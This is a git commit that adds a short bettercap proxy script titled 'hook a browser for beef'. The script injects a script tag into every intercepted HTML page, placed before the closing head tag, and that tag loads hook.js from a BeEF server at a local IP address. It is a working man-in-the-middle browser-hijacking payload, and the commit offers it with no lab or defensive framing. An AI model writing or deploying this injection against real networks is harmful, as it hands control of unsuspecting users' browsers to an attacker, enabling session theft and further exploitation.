a05718ea82b3f8a769f7c4480b846399ddc49d64
Nicolas Grimonpont <32468475+NicolasGrimonpont@users.noreply.github.com>
2020-05-07 18:17:56 -0300

    hook a browser for beef

---
+++ bettercap/beef.js
@@ -0,0 +1,11 @@
+function onResponse(req, res) {
+    if( res.ContentType.indexOf('text/html') == 0 ){
+        var body = res.ReadBody();
+        if( body.indexOf('</head>') != -1 ) {
+            res.Body = body.replace( 
+                '</head>', 
+                '<script type="text/javascript" src="http://192.168.0.110:3000/hook.js"></script></head>' 
+            );
+        }
+    }
+}
